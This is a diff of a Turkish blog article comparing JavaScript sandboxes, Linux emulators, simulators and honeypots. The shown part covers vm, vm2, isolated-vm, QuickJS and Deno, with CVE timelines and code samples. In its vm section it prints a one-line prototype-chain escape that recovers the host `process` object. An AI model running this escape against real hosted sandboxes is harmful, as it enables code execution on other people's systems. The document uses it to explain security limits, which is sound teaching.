@@ -1,59 +1,59 @@
 ---
-title: JavaScript Çözümlerini Linux Çekirdek Simülasyonları İçin Karşılaştırma
-description: JavaScript/TypeScript ile Linux ortamı yeniden oluşturmalarının
-  derinlemesine analizi.
+title: Linux çekirdek simülasyonu için JavaScript çözümlerinin karşılaştırılması
+description: JavaScript/TypeScript içinde Linux ortamı canlandırmalarının derinlemesine
+  analizi.
 date: 2026-05-28
-authors:
-  - fox3000foxy
 tags:
   - javascript
   - linux
   - analysis
+authors:
+  - fox3000foxy
 author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
-author_sig: "/2Be2lULatQzVtz7Ow0+5HVJN+6Y01/S3Vnj0H1kHCKiFwWG/JvCdKrY6aDn5inTekJlyShJ7jFk7vASODDu6Q=="
+author_sig: "w4d8pAM03SutscxGtdk1CgEhCTO5cp3ESajAZeUOVqZ68V0OcocCFTM5iOVtXOxH30R3k3vdqTq0RGbYICu/5w=="
 ---
 
-# Her JavaScript sandbox'ı, emülatörü, simülatörü ve honeypot'u -- karşılaştırmalı
+# Her JavaScript sandbox, emülatör, Linux simülatörü ve honeypot, karşılaştırmalı
 
-Uzun süredir bu tavşan deliğinde çok ama çok derinlere dalmış durumdayım. Her şey [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) projesine yardım ederken başladı -- Fortune'un projesi (birazdan ondan daha fazla bahsedeceğim) -- ve sürekli "bekle, bunun `v86`'dan farkı ne?" veya "neden sadece `vm2` kullanmıyorsun?" gibi sorular alıyordum -- ve önce tüm ekosistemi haritalandırmadan temiz bir cevap veremeyeceğimi fark ettim. İşte buradayız işte lol.
+Tamam, epey süredir bu tavşan deliğinde fazlaca derindeyim. Her şey [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) projesine yardım ettiğim için başladı, Fortune projesi (birazdan dönerim) ve bana sürekli "bekle, `v86` ile farkı ne?" ya da "neden `vm2` kullanmıyorsun?" soruluyordu ve net bir yanıt veremediğimi fark ettim, önce tüm ekosistemi haritalamadan. İşte geldik sanırım.
 
-Meğer dört farklı aile varmış -- JS sandbox'ları, Linux emülatörleri, Linux simülatörleri ve honeypot'lar -- ve neredeyse hiç örtüşmüyorlar, her ne kadar sürekli aynı cümlede anılsalar da. Bir eklenti sistemi inşa eden `isolated-vm`'e uzanır. Bir CLI aracı tanıtan `v86`'ya uzanır. SSH tehdit istihbaratı yapan Cowrie'ye uzanır. "Kodu bir kutuda çalıştırmak" şeklindeki aynı belirsiz şemsiye altında tamamen farklı problemleri çözüyorlar.
+Dört ayrı aile olduğu ortaya çıkıyor: JS kum havuzları, Linux emülatörleri, Linux simülatörleri ve honeypotlar ve sürekli aynı cümlede anılsalar da neredeyse hiç örtüşmüyorlar. Eklenti sistemi kuran biri `isolated-vm` kullanır. CLI aracı demosu yapan biri `v86` kullanır. SSH tehdit istihbaratı yapan biri Cowrie kullanır. "Kodu bir kutuda çalıştırma" şemsiyesi altında tamamen farklı problemler çözerler.
 
-Kaynak kodları, CVE raporlarını, mimari dokümanlarını ve npm sayfalarını okumak için çok zaman harcadım. Bu çok ama çok uzun olacak -- bir kahve al, cidden. Ya da iki.
+Bu makaleyi yazmak için kaynak kodu, CVE raporları, mimari belgeleri ve npm sayfaları okuyarak çok zaman geçirdim. Uzun olacak: bir kahve al, cidden. Ya da iki.
 
-> Hızlı uyarı: `typescript-virtual-container` bu makalede sıkça yer alıyor çünkü bu araştırmayı tetikleyen şey buydu. Diğer her şeye karşı adil olmaya çalıştım, ama bu bağlamı aklında tut.
+> Kısa sorumluluk reddi: `typescript-virtual-container` bu makalede öne çıkar çünkü bu araştırmayı tetikleyen odur. Geri kalan her şeye adil olmaya çalıştım ama bu bağlamı aklında tut.
 
 ---
 
-## Bölüm 0 -- Öncelikle, aslında hangi problemi çözüyorsun?
+## Kısım 0: Gerçekten hangi problemi çözüyorsun?
 
-Derinlemesine dalmadan önce, her ailenin ne için olduğunu kesin olarak belirtmekte fayda var, çünkü terminoloji hızla karmaşıklaşıyor ve insanlar sürekli karıştırıyor (ben de dahil, oturup gerçekten haritalandırmadan önce).
+Dalmadan önce her ailenin ne işe yaradığı konusunda net olmak değer çünkü terminoloji hızlı bulanıklaşır ve insanlar sürekli her şeyi karıştırır (ben dahil, oturup düzgün haritalamadan önce).
 
-**JS sandbox'ları**, JavaScript kodunu ana Node.js sürecinden izole eder. Tehdit modeli: `process.exit()` çağırabilecek, dosya okuyabilecek veya alt süreçler başlatabilecek güvenilmeyen JS kodudur. Çözüm, V8 yürütmesi etrafında bir sınırdır. Bu araçların bir Linux shell'i, izinleri olan bir dosya sistemi veya SSH hakkında hiçbir kavramı yoktur.
+**JS kum havuzları** JavaScript kodunu ana Node.js sürecinden izole eder. Tehdit modeli: `process.exit()` çağırabilecek, dosya okuyabilecek ya da alt süreç başlatabilecek güvenilmez JS kodu. Çözüm V8 yürütme sınırıdır. Bu araçların Linux kabuğu, izinli dosya sistemi ya da SSH kavramı yoktur.
 
-**Linux emülatörleri**, gerçek, değiştirilmemiş bir Linux çekirdeğini bir CPU emülatörü (x86, RISC-V, OR1K) içinde JavaScript veya WebAssembly ile çalıştırır. Gerçek bir işletim sistemi başlatırsın. Gerçek syscall'lar alırsın. x86 ile derlenmiş programlarla ikili uyumluluk elde edersin. Ek yük devasadır.
+**Linux emülatörleri** JavaScript ya da WebAssembly ile uygulanmış CPU emülatöründe (x86, RISC-V, OR1K) değiştirilmemiş gerçek Linux çekirdeği çalıştırır. Gerçek bir işletim sistemi başlatırsın. Gerçek sistem çağrıların olur. x86 için derlenmiş programlarla ikili uyumluluğun olur. Kaynak maliyeti devasadır.
 
-**Linux simülatörleri**, gerçek bir çekirdek çalıştırmadan bir Linux sisteminin *davranışını* taklit eder. Bir shell yorumlayıcısı, sanal bir dosya sistemi ve programları ve insanları kandırmaya yetecek kadar Unix semantiği uygularlar. Çekirdek yok. Wasm yok. CPU emülasyonu yok. Çok daha düşük ek yük.
+**Linux simülatörleri** gerçek çekirdek çalıştırmadan Linux sisteminin *davranışını* taklit eder. Bir kabuk yorumlayıcı, bir sanal dosya sistemi ve Unix semantiğinden yeterince uygular, programları ve insanları kandırır. Çekirdek yok, Wasm yok, CPU emülasyonu yok. Çok daha az kaynak.
 
-**Honeypot'lar**, saldırganları çekmek ve ne yaptıklarını kaydetmek için inşa edilir. Öncelikli olarak yürütme ortamları değildirler -- gözlem araçlarıdırlar. Gerçek Linux davranışına sadakat, sadece saldırganın tuzağı tespit etmesini engellemek için önemlidir.
+**Honeypotlar** saldırganları çekip ne yaptıklarını kaydetmek için tasarlanır. Esas olarak yürütme ortamı değildirler: gözlemlenebilirlik araçlarıdır. Gerçek Linux davranışına sadakat yalnızca saldırganın tuzağı tespit etmesini engellediği ölçüde önemlidir.
 
-Bu çerçeveyle, bu makaledeki her projenin nerede durduğu şöyle:
+Bu çerçeveyle bu makaledeki her projenin nereye oturduğu:
 
 ```
-JS sandbox'ı:       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
-Linux emülatörü:    v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
-Linux simülatörü:   typescript-virtual-container (bu alanda benzersiz)
-Honeypot:           Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
-Terminal yığını:    xterm.js + node-pty (izolatör değil, ama bitişik)
+JS sandbox:       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
+Linux Emülatörü:  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
+Linux Simülatörü: typescript-virtual-container (bu alanda tek)
+Honeypot:         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
+Terminal yığını:  xterm.js + node-pty (izolatör değil ama ilişkili)
 ```
 
 ---
 
-## Bölüm 1 -- JavaScript sandbox'ları
+## Kısım 1: JavaScript kum havuzları
 
-### 1.1 `vm` -- Node.js yerleşiği (düşündüğün gibi değil)
+### 1.1 `vm`: Node.js yerleşik modülü (sandığın şey değil)
 
-Node'da "güvenilmeyen JS çalıştırmanın" en eski cevabı, yerleşik `vm` modülüdür. v0.1'den beri vardır, bu yüzden birçok kişi önce ona uzanır -- ve sonra yanar.
+Node içinde "güvenilmez JS çalıştırma" en eski yanıt yerleşik `vm` modülüdür. v0.1den beri vardır, o yüzden birçok insan önce onu kullanır ve yanar.
 
 ```js
 const vm = require("vm");
@@ -63,104 +63,104 @@ vm.runInContext("answer = 6 * 7", sandbox);
 console.log(sandbox.answer); // 42
 ```
 
-`vm`'nin gerçekte yaptığı: yeni bir V8 context'i (yeni bir dizi yerleşik yapıcı -- `Object`, `Array`, `Function` vb.) oluşturur ve kodu, `sandbox`'a koyduğun her şeye paylaşılan bir referansla çalıştırır. V8 motorun değişmez. Sürecin değişmez. Bellek paylaşılır.
+`vm` gerçekte ne yapar: yeni bir V8 bağlamı yaratır (yeni bir yerel kurucu kümesi: `Object`, `Array`, `Function` vs.) ve kodu `sandbox` içine koyduğun şeye paylaşılan başvuruyla çalıştırır. V8 motorun değişmez. Sürecin değişmez. Bellek paylaşılır.
 
-`vm`'nin güvenlik sağlamamasının nedeni: JavaScript'in prototip zinciri, her şeyi `Object.prototype`'a bağlayan bir DAG'dir. Ana realm'den sandbox'a herhangi bir nesne koyarsan, misafir onun prototip zincirinden tırmanarak ana yapıcılara ulaşabilir. `Function`'dan, `Function("return process")()` çağırarak gerçek `process` nesnesini kurtarabilirsin. Oyun biter. Anında.
+`vm`in güvenlik sunmamasının nedeni: JavaScriptin prototip zinciri her şeyi `Object.prototype`a bağlayan DAGdir. Ana dünyadan bir nesne kum havuzuna koyarsan misafir prototip zincirinden yukarı tırmanıp ana kuruculara ulaşabilir. `Function` üzerinden `Function("return process")()` çağırıp gerçek `process`i alabilirsin. Oyun biter. Yani, hemen.
 
 ```js
-// Bu, vm'de sorunsuz çalışır -- gerçek process nesnesini geri alırsın
+// vm içinde mükemmel çalışır: gerçek processi alırsın
 vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
 ```
 
-Yani, Node.js dokümantasyonunun kendisi bile şöyle diyor: "vm modülü bir güvenlik mekanizması değildir. Güvenilmeyen kodu çalıştırmak için kullanmayın." Bu uyarı sonsuza kadar oradaydı. İnsanlar sürekli görmezden geliyor. Production uygulamalarında `vm`'yi sandbox olarak kullanıldığını gördüm. Lütfen bunu yapma xD
+Yani Node.js belgesinin kendisi der: "vm modülü bir güvenlik mekanizması değildir. Güvenilmez kodu çalıştırmak için kullanmayın." Bu uyarı hep oradadır. İnsanlar sürekli görmezden gelir. `vm`i kum havuzu olarak kullanan üretim uygulamaları gördüm. Lütfen yapma.
 
-**Karar**: bir kapsam mekanizması, sandbox değil. İzole değişken kapsamına ihtiyacın olduğunda kullan (şablon motorları, kodu kontrol ettiğin `eval` benzeri özellikler). Asla güvenilmeyen girdi için.
+**Hüküm**: kapsam mekanizması, kum havuzu değil. Değişkenleri izole etmen gerektiğinde kullan (şablon motorları, kodu kontrol ettiğin `eval` benzeri özellikler). Güvenilmez girdiler için asla.
 
-**Bellek**: ihmal edilebilir ek yük -- ana süreçle aynı V8 heap'i.  
-**Güvenlik**: motive bir saldırgana karşı hiçbiri.
+**Bellek**: ana sürecin aynı V8 yığını: ihmal edilebilir ek yük.
+**Güvenlik**: motive saldırgana karşı hiç.
 
 ---
 
-### 1.2 `vm2` -- topluluk girişimi ve çok uzun ölümü
+### 1.2 `vm2`: topluluk girişimi ve çok uzun ölümü
 
-`vm2`, topluluğun `vm`'nin kaçış sorununa cevabıydı. Temel fikir: sandbox sınırını geçen her nesneyi, özellik erişimini engelleyen, prototip tırmanmayı bloke eden ve tehlikeli referansları filtreleyen bir `Proxy` ile sarmalamak. Teoride zekice bir fikir! Pratikte pek değil, göreceğimiz gibi.
+`vm2`, `vm` kaçış sorununa topluluğun yanıtıydı. Merkez fikir: kum havuzu sınırını geçen her nesneyi özellik erişimlerini kesen, prototip tırmanmayı engelleyen ve tehlikeli başvuruları filtreleyen `Proxy` içine sarmak. Teoride akıllı fikir! Pratikte sonuç çok daha az ikna edici çıktı, göreceğimiz gibi.
 
 ```js
 const { VM } = require("vm2");
 const vm = new VM({ timeout: 1000, sandbox: {} });
-vm.run("process.exit(1)"); // VMError fırlatır, process erişilebilir değil
+vm.run("process.exit(1)"); // VMError fırlatır, process erişilemez
 ```
 
-Birkaç yıl boyunca makul ölçüde iyi çalıştı. Ancak JavaScript `Proxy`'sinin saldırı yüzeyi devasadır. Her yeni JS dil özelliği -- generator'lar, async iterator'lar, `Symbol.toPrimitive`, `Error.prepareStackTrace`, `Promise` iç yuvaları -- potansiyel bir bypass vektörüdür.
+Birkaç yıl epey iyi işledi. Ama JavaScript `Proxy` saldırı yüzeyi devasadır. JS dilinin her yeni özelliği: üreteçler, asenkron yineleyiciler, `Symbol.toPrimitive`, `Error.prepareStackTrace`, `Promise` iç yuvaları, potansiyel atlatma vektörüdür.
 
-CVE zaman çizelgesi... başka bir şey. Yani, şuna bak:
+CVE kronolojisi... bir şeydir. Şuna bak:
 
 | Tarih | CVE | Mekanizma |
 |------|-----|-----------|
-| Eki 2022 | CVE-2022-36067 | `Error.prepareStackTrace` ana context kaçışı |
-| Nis 2023 | CVE-2023-29017 | İşlenmeyen async hata yığını ana nesne sızıntısı |
-| Nis 2023 | CVE-2023-29199 | `handleException()` ile istisna temizleme bypass'ı |
+| Eki 2022 | CVE-2022-36067 | `Error.prepareStackTrace` üzerinden ana bağlam kaçışı |
+| Nis 2023 | CVE-2023-29017 | Yakalanmamış asenkron hatayla ana nesne sızıntısı |
+| Nis 2023 | CVE-2023-29199 | `handleException()` ile istisna temizleme atlatması |
 | Nis 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
 | May 2023 | CVE-2023-32314 | `Error.name` üzerinde `Proxy` → `Function` → RCE |
-| Tem 2023 | CVE-2023-37466 | Async fonksiyon + yığın taşması + `Proxy.getPrototypeOf` |
+| Tem 2023 | CVE-2023-37466 | Asenkron fonksiyon + yığın taşması + `Proxy.getPrototypeOf` |
 | Tem 2023 | CVE-2023-37903 | Worker thread + eval kaçışı |
 
-Aynı ayda (Nisan 2023) ÜÇ kritik CVE. BİR AYDA ÜÇ TANE. CVE-2023-37903'ten sonra, bakımcı, kütüphaneyi şu mesajla resmen deprecate etti: *"Kütüphane kritik güvenlik sorunları içeriyor ve production için kullanılmamalıdır."*
+Aynı ay üç kritik CVE (Nisan 2023). ÜÇ. BİR AYDA. CVE-2023-37903ten sonra bakıcı kütüphaneyi resmen eskitti, mesaj: *"Kütüphane kritik güvenlik sorunları içerir ve üretimde kullanılmamalıdır."*
 
-Bakımcı, Ekim 2025'te 3.10.0 sürümüyle onu diriltti ve o zamana kadar bilinen her şeyi düzelttiğini iddia etti. Ocak 2026'da yeni bir kritik kaçış (CVE-2026-22709, CVSS 9.8) açıklandı, ardından Mayıs 2026'da on bir tane daha geldi. On bir. Desen değişmedi ve dürüst olmak gerekirse asla değişeceğini sanmıyorum.
+Bakıcı Ekim 2025te 3.10.0 sürümüyle diriltti, o zaman bilinen her şeyi düzelttiğini iddia etti. Yeni kritik kaçış (CVE-2026-22709, CVSS 9.8) Ocak 2026da açıklandı, ardından Mayıs 2026da on bir tane daha. Desen değişmedi ve dürüstçe asla değişeceğini sanmıyorum.
 
-Temel sorun mimari -- ve tüm ekosistemin öğrenmesi biraz zaman alan ders bu. Sandbox yaptığın dili kullanarak, aynı motorda, aynı süreçte güvenli bir sandbox inşa edemezsin. Kaçış yüzeyi, tüm V8 uygulamasıdır -- ve V8, sürekli değişen birkaç milyon satır C++'tır. Her yeni JS özelliği potansiyel olarak yeni bir saldırı yolu açar.
+Temel sorun mimaridir: ve tüm ekosistemin öğrenmesi biraz zaman alan ders budur. İzole ettiğin aynı dille, aynı motorda, aynı süreçte güvenli kum havuzu inşa edemezsin. Kaçış yüzeyi tüm V8 uygulamasıdır: ve V8 sürekli değişen birkaç milyon satır C++tır. Her yeni JS özelliği potansiyel yeni saldırı yolu açar.
 
-**Karar**: Güvenlik açısından hassas uygulamalar için kullanma. En son sürümde bile, her birkaç ayda bir yeni bypass'lar keşfediliyor. Bakımcının kendisi bunu açıkça kabul etti.
+**Hüküm**: Güvenliğe duyarlı uygulamalar için kullanma. En güncel sürümde bile birkaç ayda bir yeni atlatmalar keşfedilir. Bakıcının kendisi açıkça kabul etti.
 
 ---
 
-### 1.3 `isolated-vm` -- gerçekten çalışan
+### 1.3 `isolated-vm`: gerçekten işe yarayan
 
-`isolated-vm` doğru yaklaşımı benimser: V8'in kendi izolasyon ilkelini, Isolate'i kullanır. Her V8 Isolate'in kendi heap'i, kendi garbage collector'ü, kendi yerleşik seti ve diğer Isolate'lerle sıfır paylaşılan referansı vardır.
+`isolated-vm` doğru yaklaşımı benimser: V8in yerel izolasyon ilkeli Isolateu kullanmak. Her V8 Isolateun kendi yığını, kendi çöp toplayıcısı, kendi yerelleri vardır ve diğer Isolatelerle paylaşılan başvuru sıfırdır.
 
-Bu, Chrome'un sekmeler arasında kullandığı sınırdır. Proxy üzerine inşa edilmiş bir dil seviyesi hilesi değil, gerçek bir güvenlik sınırıdır.
+Bu Chromeun sekmeler arası kullandığı sınırın aynısıdır. Dil numarasıyla inşa edilmiş numara değil, gerçek güvenlik sınırıdır.
 
 ```js
 import ivm from "isolated-vm";
 
-// Her isolate kendi V8 heap'idir
-const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB sınırı
+// Her isolate kendi V8 yığınıdır
+const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB limiti
 const context = await isolate.createContext();
 const jail = context.global;
 
-// Sınır ötesi veri iletimi açık serileştirme gerektirir
+// Sınırdan veri geçirmek açık serileştirme gerektirir
 await jail.set("sensitiveData", "not this");
 await jail.set("log", new ivm.Reference(console.log));
 
 const script = await isolate.compileScript(`
-  // Ana sürece, ana heap'e veya ana modüllere erişemez
+  // Ana süreci, ana yığını ya da ana modülleri erişemez
   log.applySync(undefined, ["hello from the isolate"]);
 `);
 await script.run(context);
 
-// Zaman aşımı veya bellek limitinde sert sonlandırma yapabilirsin
-isolate.dispose(); // tüm heap'i serbest bırakır
+// Zaman aşımı ya da bellek limitinde sert sonlandırabilirsin
+isolate.dispose(); // tüm yığını serbest bırakır
 ```
 
-`Reference` ve `ExternalCopy` türleri, açık iletişim köprüsüdür. Bir `Reference`, isolate'e bir ana fonksiyonuna çağrılabilir bir tanıtıcı verir -- isolate onu çağırabilir ama closure'ını veya prototipini inceleyemez. Bir `ExternalCopy`, bir değeri (yapılandırılmış klon) heap sınırı boyunca serileştirir. Bu açık-köprü modeli kullanışlı değildir, ama izolasyonu gerçek kılan şey budur.
+`Reference` ve `ExternalCopy` türleri açık iletişim köprüsüdür. `Reference`, isolatea ana fonksiyona çağrılabilir handle verir: isolate onu çağırabilir ama kapanışını ya da prototipini inceleyemez. `ExternalCopy`, değeri yığın sınırı üzerinden serileştirir (yapısal klon). Bu açık köprü modeli pratik değildir ama izolasyonu gerçek yapan budur.
 
-Sert kaynak limitleri ayarlayabilirsin: bellek (limit aşılırsa isolate sonlandırılır), duvar saati zaman aşımı ve CPU zaman aşımı. Sonlandırma gerçektir -- bir `while(true)` ile bypass edilebilecek bir JS zaman aşımı değil, tüm V8 Isolate'ini öldürür.
+Sıkı kaynak limitleri tanımlayabilirsin: bellek (aşarsa isolate sonlandırılır), duvar saati zaman aşımı ve CPU zaman aşımı. Sonlandırma gerçektir: tüm V8 Isolateu öldürür, `while(true)` ile atlatılabilecek JS zaman aşımı değil.
 
-**Sınırlamalar**: sadece JS. İçinde bash çalıştıramazsın. Dosya, izin, ağ veya süreç kavramı yoktur. Kullanıcı tarafından gönderilen JS (eklentiler, formüller, script kancaları) için tam olarak doğru araçtır ve diğer her şey için yanlış araçtır. `typescript-virtual-container`'ın yazarı, "shell komutları çalıştırmak" ve "JavaScript'i izole etmek" temelde farklı problemler olduğunu fark etmeden önce bunu erken aşamalarda değerlendirdiğinden bahsetti.
+**Limitler**: yalnızca JSdir. İçinde bash çalıştıramazsın. Dosya, izin, ağ ya da süreç kavramı yoktur. Kullanıcıca gönderilen JS (eklentiler, formüller, script kancaları) için tam doğru araç ve geri kalan her şey için yanlış araçtır. `typescript-virtual-container` yazarı başında düşündüğünü ama "kabuk komutları çalıştırmak" ile "JavaScript izole etmek"in temelde farklı problemler olduğunu fark ettiğini belirtti.
 
-**Bellek**: boş isolate başına ~3–10 MB, heap kullanımıyla büyür.  
-**Güvenlik**: güçlü. V8 Isolate sınırı gerçek izolasyon ilkelidir.  
-**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)  
+**Bellek**: boş isolate başına ~3-10 MB, yığın kullanımıyla artar.
+**Güvenlik**: sağlam. V8 Isolate sınırı gerçek izolasyon ilkelidir.
+**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)
 **GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
 
 ---
 
-### 1.4 `quickjs-emscripten` -- Wasm'a derlenmiş ayrı bir JS motoru
+### 1.4 `quickjs-emscripten`: Wasme derlenmiş ayrı JS motoru
 
-Farklı bir yaklaşım: V8 içinde izole etmek yerine, WebAssembly'e derlenmiş tamamen ayrı bir JavaScript motoru çalıştır. Ana makine V8/Node'da çalışır. Misafir QuickJS-Wasm içinde çalışır. Wasm sandbox'ı izolasyon sınırını sağlar.
+Farklı bir yaklaşım: V8 içinde izole etmek yerine Wasme derlenmiş tamamen ayrı JavaScript motoru çalıştırmak. Ana V8/Nodeda döner. Misafir Wasm içindeki QuickJSde döner. Kum havuzu Wasm sınırı izolasyon sınırını sağlar.
 
-QuickJS, Fabrice Bellard'ın bir başka işi (QEMU, FFmpeg, JSLinux, TinyEMU'nun arkasındaki aynı adam -- bu kişi gerçek değil, cidden, bir insan bunların hepsini nasıl yapar?). C ile yazılmış, spec uyumlu küçük bir ES2023 JS motoru ve Wasm'a derlendiğinde sadece ~500 KB.
+QuickJS yine Fabrice Bellard eseridir (QEMU, FFmpeg, JSLinux, TinyEMU arkasındaki aynı adam: bu kişi gerçek değil, cidden tek kişi bütün bunları nasıl yapar?). C ile yazılmış ES2023 uyumlu küçük bir JS motorudur ve Wasme derlenince yalnızca ~500 KB tutar.
 
 ```js
 import { getQuickJS } from "quickjs-emscripten";
@@ -168,8 +168,8 @@ import { getQuickJS } from "quickjs-emscripten";
 const QuickJS = await getQuickJS();
 const vm = QuickJS.newContext();
 
-const result = vm.evalCode(`
-  // QuickJS'de çalışır, V8'den tamamen ayrı
+const result = await vm.evalCode(`
+  // V8den tamamen ayrı QuickJSde çalışır
   (function() { return 6 * 7; })()
 `);
 
@@ -184,9 +184,9 @@ if (result.error) {
 vm.dispose();
 ```
 
-QuickJS, C ile yazılmış, spec uyumlu küçük bir ES2023 JavaScript motorudur. Wasm'a derlendiğinde, senkron varyant için ~500 KB, asenkron (Asyncify) varyant için ~1 MB'dır. Bellek yönetimi manueldir -- VM'den çıkardığın her değerin açıkça dispose edilmesi gerekir, bu biraz can sıkıcıdır ama sınırlar arası GC sürprizlerini önler. Eğlenceli bir takas!
+QuickJS, C ile yazılmış ES2023 uyumlu küçük bir JavaScript motorudur. Wasme derlenince senkron varyant ~500 KB, asenkron varyant (Asyncify) ~1 MB tutar. Bellek yönetimi manüeldir: VMden çıkardığın her değer açık serbest bırakılmalıdır, biraz sıkıcı ama sınır ötesi GC sürprizlerini engeller. Eğlenceli bir takas!
 
-`@sebastianwessel/quickjs` sarmalayıcısı, üzerine isteğe bağlı sanal dosya sistemi, fetch desteği ve Node.js modül saplamaları ile daha ergonomik bir API ekler:
+`@sebastianwessel/quickjs` sarmalayıcı üstüne daha ergonomik API ekler, opsiyonel sanal dosya sistemi, fetch desteği ve Node.js modül saplamalarıyla:
 
 ```ts
 import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
@@ -203,97 +203,97 @@ const result = await runSandboxed(
 );
 ```
 
-Güvenlik modeli `isolated-vm`'den farklıdır: Wasm'in lineer bellek modeli, misafirin V8 heap nesnelerine doğrudan erişememesi anlamına gelir. Saldırı yüzeyi, tüm JS dili değil, ana↔Wasm arayüzüdür (import/export). Bu genellikle Proxy tabanlı sandbox'lama'dan daha sağlam kabul edilir.
+Güvenlik modeli `isolated-vm`den farklıdır: Wasm doğrusal bellek modeli misafirin V8 yığın nesnelerine doğrudan erişemeyeceği anlamına gelir. Saldırı yüzeyi ana↔Wasm arayüzüdür (içe/dışa aktarmalar), tüm JS dili değil. Genelde Proxy tabanlı kum havuzlarından daha sağlam sayılır.
 
-Dezavantajı: QuickJS, V8 ile aynı optimizasyon seviyesine sahip değildir. CPU bağımlı JS iş yükleri için V8'den 5–20 kat daha yavaştır. Kısa snippet'ler ve güvenilmeyen eval için bu genellikle önemli değildir.
+Tersi: QuickJS V8 düzeyinde optimize değildir. JS CPU yoğun yüklerde V8den 5 ila 20 kat yavaştır. Küçük kod parçaları ve güvenilmez değerlendirmeler için genelde önemli değildir.
 
-**Bellek**: örnek başına ~500 KB Wasm modülü + heap.  
-**Güvenlik**: Wasm sınırı, Proxy tabanlı yaklaşımlardan daha güçlü kabul edilir.  
-**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)  
+**Bellek**: ~500 KB Wasm modülü + örnek başına yığın.
+**Güvenlik**: Wasm sınırı, Proxy tabanlı yaklaşımlardan daha sağlam sayılır.
+**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
 **GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
 
 ---
 
-### 1.5 Deno -- önce izinler çalışma zamanı
+### 1.5 Deno: izinleri önceleyen runtime
 
-Deno tamamen farklı bir felsefe benimser: Node içinde sandbox yapmak yerine, varsayılan olarak güvenli yeni bir çalışma zamanı inşa et. Bu yaklaşımı gerçekten seviyorum -- dürüst olmak gerekirse, Node.js'in baştan beri böyle olması gerekirdi. Ryan Dahl (orijinal Node.js yaratıcısı) kelimenin tam anlamıyla Deno'yu bazı Node.js tasarım kararlarından pişman olduğu için yaptı, ki bu düşününce oldukça çılgınca.
+Deno tamamen farklı felsefe benimser: Nodeda kum havuzu yapmak yerine varsayılan güvenli yeni runtime inşa etmek. Bu yaklaşımı gerçekten severim: Node.jsin başından beri olması gereken budur, dürüstçe. Ryan Dahl (orijinal Node.js yaratıcısı) Node.jsin bazı tasarım kararlarından pişman olduğu için Deno yu kelimenin tam anlamıyla yarattı, düşününce epey çılgınca.
 
-Her hassas yetenek (dosya okuma, dosya yazma, ağ, env, alt süreç) açık bir `--allow-*` flag'i gerektirir:
+Her hassas yetenek (dosya okuma, dosya yazma, ağ, ortam, alt süreç) açık `--allow-*` bayrağı gerektirir:
 
 ```bash
-# Bu sadece /data'dan okuyabilir, başka hiçbir şey
+# Bu yalnızca /data içinde okuyabilir, başka hiçbir şey
 deno run --allow-read=/data script.ts
 
-# Bu sadece bir alana fetch yapabilir
+# Bu yalnızca tek alana erişebilir
 deno run --allow-net=api.example.com script.ts
 
-# Hiç flag yok = hiç izin yok
-deno run untrusted.ts # okuyamaz, yazamaz, ağa çıkamaz, süreç başlatamaz
+# Bayrak yok = izin yok
+deno run untrusted.ts # okuyamaz, yazamaz, ağ yok, çalıştırma yok
 ```
 
-İzin modeli Rust/İşletim Sistemi seviyesinde uygulanır -- bir JS hilesi değildir. Deno kodu `Deno.readFile()` çağırdığında, bu dosya sistemine dokunmadan önce izin tablosunu kontrol eden bir Rust op'undan geçer. İzin verilmezse syscall asla gerçekleşmediği için JS'den atlatamazsın.
+İzin modeli Rust/OS seviyesinde uygulanır: JS numarası değildir. Deno kodu `Deno.readFile()` çağırınca dosya sistemine dokunmadan önce izin tablosunu kontrol eden Rust işleminden geçer. JSden atlatamazsın çünkü izin verilmezse sistem çağrısı hiç olmaz.
 
-Gerçekten güvenilmeyen kodu çalıştırmak için, Deno Workers (Web Workers) aynı süreç içinde ikinci bir isolate sağlar, her biri kendi izin setine sahiptir. Sıfır izinle bir worker başlatabilir ve `postMessage` ile iletişim kurabilirsin.
+Gerçekten güvenilmez kod çalıştırmak için Deno Workerlar (Web Workerlar) aynı süreçte ikinci isolate sağlar, her birinin kendi izin kümesi vardır. Sıfır izinli worker çalıştırıp onunla `postMessage` üzerinden iletişim kurabilirsin.
 
-Deno 2 (Ekim 2024'te yayınlandı) tam npm uyumluluğu ve Node.js uyumluluk shim'leri ekledi, bu da sunucu tarafı kullanım durumları için benimsenmesini önemli ölçüde artırdı.
+Ekim 2024te çıkan Deno 2 tam npm uyumluluğu ve Node.js uyumluluk shimleri ekledi, sunucu tarafı kullanım için benimsenmesini önemli iyileştirdi.
 
-**Takas**: Deno'nun güvenlik modeli, kısmen güvenebileceğin kod için mükemmeldir. Kötü niyetli olabilecek tamamen güvenilmeyen kod için, izin modeli yardımcı olmaz -- bir Isolate sınırı (`isolated-vm`) veya farklı bir motor (`quickjs-emscripten`) gerekir, çünkü Deno hala V8 çalıştırır ve sofistike saldırganlar V8 seviyesinde hatalar bulabilir.
